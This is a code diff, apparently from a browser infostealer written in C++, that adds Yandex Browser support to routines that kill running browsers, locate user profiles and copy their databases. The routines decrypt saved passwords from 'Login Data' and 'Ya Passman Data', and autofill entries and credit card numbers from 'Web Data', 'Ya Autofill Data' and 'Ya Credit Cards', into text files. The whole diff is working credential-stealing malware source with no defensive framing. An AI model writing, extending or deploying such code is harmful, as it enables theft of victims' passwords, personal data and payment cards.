@@ -152,9 +152,20 @@ int main() {
             "thunderbird_extract",
             "thunderbird_tmp",
             false, true, false, true
+        },
+        {
+            "Yandex Browser",
+            "browser.exe",
+            {L"C:\\Program Files\\Yandex\\YandexBrowser\\Application\\browser.exe", L"C:\\Program Files (x86)\\Yandex\\YandexBrowser\\Application\\browser.exe"},
+            "browser.dll",
+            {L"Yandex", L"YandexBrowser", L"User Data"},
+            "yandex_extract",
+            "yandex_tmp",
+            false, false, true, false
         }
     };
 
+    kill_processes_by_name("browser.exe");
     kill_processes_by_name("chrome.exe");
     kill_processes_by_name("msedge.exe");
     kill_processes_by_name("brave.exe");
@@ -242,6 +253,17 @@ int main() {
                     }
                     if (fs::exists(operaUserPath)) {
                         exe_path = operaUserPath;
+                    }
+                }
+            }
+            // Check for Yandex user path
+            if (config.name.find("Yandex") != std::string::npos) {
+                wchar_t* localAppData;
+                if (SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &localAppData) == S_OK) {
+                    std::wstring yandexUserPath = std::wstring(localAppData) + L"\\Yandex\\YandexBrowser\\Application\\browser.exe";
+                    CoTaskMemFree(localAppData);
+                    if (fs::exists(yandexUserPath)) {
+                        exe_path = yandexUserPath;
                     }
                 }
             }
@@ -707,6 +729,9 @@ bool extract_key(uint32_t thread_id, HANDLE h_process, const BrowserConfig& conf
 
 void extract_passwords(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
     fs::path db_path = profile_path / "Login Data";
+    if (!fs::exists(db_path)) {
+        db_path = profile_path / "Ya Passman Data";
+    }
     if (!fs::exists(db_path)) return;
 
     fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
@@ -774,54 +799,59 @@ void extract_cookies(const fs::path& profile_path, const fs::path& output_dir, c
 }
 
 void extract_autofill(const fs::path& profile_path, const fs::path& output_dir, const std::vector<uint8_t>& v10_key, const std::vector<uint8_t>& v20_key, const std::string& temp_prefix, bool is_opera) {
-    fs::path db_path = profile_path / "Web Data";
-    if (!fs::exists(db_path)) return;
+    std::vector<std::string> db_names = {"Web Data", "Ya Autofill Data", "Ya Credit Cards"};
 
-    fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
-    fs::copy(db_path, temp_db);
+    std::ofstream ofs(output_dir / "autofill.txt");
 
-    sqlite3* db;
-    if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
-        std::ofstream ofs(output_dir / "autofill.txt");
-        sqlite3_stmt* stmt;
+    for (const auto& db_name : db_names) {
+        fs::path db_path = profile_path / db_name;
+        if (!fs::exists(db_path)) continue;
 
-        if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == 0) {
-            while (sqlite3_step(stmt) == 100) {
-                ofs << "Form: " << (const char*)sqlite3_column_text(stmt, 0) << " = " << (const char*)sqlite3_column_text(stmt, 1) << "\n";
-            }
-            sqlite3_finalize(stmt);
-        }
+        fs::path temp_db = fs::temp_directory_path() / (temp_prefix + "_" + std::to_string(GetTickCount64()));
+        fs::copy(db_path, temp_db);
 
-        const char* tables[] = {"autofill_profile_names", "autofill_profile_emails", "autofill_profile_phones"};
-        for (const char* table : tables) {
-            std::string col = strstr(table, "name") ? "first_name" : (strstr(table, "email") ? "email" : "number");
-            std::string sql = "SELECT guid, " + col + " FROM " + table;
-            if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, NULL) == 0) {
+        sqlite3* db;
+        if (sqlite3_open(temp_db.string().c_str(), &db) == 0) {
+            sqlite3_stmt* stmt;
+
+            if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, NULL) == 0) {
                 while (sqlite3_step(stmt) == 100) {
-                    ofs << table << " (" << (const char*)sqlite3_column_text(stmt, 0) << "): " << (const char*)sqlite3_column_text(stmt, 1) << "\n";
+                    ofs << "Form: " << (const char*)sqlite3_column_text(stmt, 0) << " = " << (const char*)sqlite3_column_text(stmt, 1) << "\n";
                 }
                 sqlite3_finalize(stmt);
             }
-        }
 
-        if (sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, NULL) == 0) {
-            while (sqlite3_step(stmt) == 100) {
-                const char* name = (const char*)sqlite3_column_text(stmt, 0);
-                int m = sqlite3_column_int(stmt, 1);
-                int y = sqlite3_column_int(stmt, 2);
-                const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3);
-                int blob_size = sqlite3_column_bytes(stmt, 3);
-
-                std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(blob_ptr, blob_ptr + blob_size), v10_key, v20_key, is_opera);
-                if (!dec.empty()) {
-                    ofs << "Card: " << (name ? name : "") << " | Exp: " << m << "/" << y << " | Num: " << std::string(dec.begin(), dec.end()) << "\n";
+            const char* tables[] = {"autofill_profile_names", "autofill_profile_emails", "autofill_profile_phones"};
+            for (const char* table : tables) {
+                std::string col = strstr(table, "name") ? "first_name" : (strstr(table, "email") ? "email" : "number");
+                std::string sql = "SELECT guid, " + col + " FROM " + table;
+                if (sqlite3_prepare_v2(db, sql.c_str(), -1, &stmt, NULL) == 0) {
+                    while (sqlite3_step(stmt) == 100) {
+                        ofs << table << " (" << (const char*)sqlite3_column_text(stmt, 0) << "): " << (const char*)sqlite3_column_text(stmt, 1) << "\n";
+                    }
+                    sqlite3_finalize(stmt);
                 }
             }
-            sqlite3_finalize(stmt);
+
+            if (sqlite3_prepare_v2(db, "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", -1, &stmt, NULL) == 0) {
+                while (sqlite3_step(stmt) == 100) {
+                    const char* name = (const char*)sqlite3_column_text(stmt, 0);
+                    int m = sqlite3_column_int(stmt, 1);
+                    int y = sqlite3_column_int(stmt, 2);
+                    const uint8_t* blob_ptr = (const uint8_t*)sqlite3_column_blob(stmt, 3);
+                    int blob_size = sqlite3_column_bytes(stmt, 3);
+
+                    std::vector<uint8_t> dec = decrypt_blob(std::vector<uint8_t>(blob_ptr, blob_ptr + blob_size), v10_key, v20_key, is_opera);
+                    if (!dec.empty()) {
+                        ofs << "Card: " << (name ? name : "") << " | Exp: " << m << "/" << y << " | Num: " << std::string(dec.begin(), dec.end()) << "\n";
+                    }
+                }
+                sqlite3_finalize(stmt);
+            }
+            sqlite3_close(db);
         }
-        sqlite3_close(db);
+        fs::remove(temp_db);
     }
-    fs::remove(temp_db);
 }
 
 void extract_history(const fs::path& profile_path, const fs::path& output_dir, const std::string& temp_prefix) {
@@ -859,13 +889,14 @@ void extract_all_profiles_data(const std::vector<uint8_t>& v20_key, const Browse
     fs::path output_root(config.output_dir);
     fs::create_directories(output_root);
 
-    bool is_opera = config.name.find("Opera") != std::string::npos;
+    bool is_opera = config.name.find("Opera") != std::string::npos || config.name.find("Yandex") != std::string::npos;
 
     for (const auto& entry : fs::directory_iterator(user_data)) {
         if (entry.is_directory()) {
             bool is_profile = fs::exists(entry.path() / "Preferences") ||
                              fs::exists(entry.path() / "Cookies") ||
-                             fs::exists(entry.path() / "Network" / "Cookies");
+                             fs::exists(entry.path() / "Network" / "Cookies") ||
+                             fs::exists(entry.path() / "Ya Passman Data");
 
             if (is_profile) {
                 std::string profile_name = entry.path().filename().string();
